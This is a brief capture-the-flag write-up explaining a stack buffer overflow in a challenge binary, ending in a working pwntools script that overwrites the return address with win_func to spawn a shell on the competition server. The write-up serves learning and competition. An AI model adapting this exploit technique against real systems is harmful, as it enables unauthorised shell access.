# Give away 0

Simple buffer overflow. There is a function win\_func that calls system on a global variable. We can read this global variable and find it's value is `/bin/sh` - it pops a shell for us.

In the function vuln, it reads `0x32` bytes into a buffer at `rbp-0x20`. This allows us to overwrite the return address with the address of winfunc.

So our exploit is `0x28 bytes of junk + address of win_func`.

```python
from pwn import *
NUM_TO_RET = 0x20 + 8
e = ELF("./0give")
#p = e.process()
p = remote('sharkyctf.xyz', 20333)
payload = b'A' * NUM_TO_RET + p64(e.symbols['win_func'])
p.sendline(payload)
p.interactive()
```

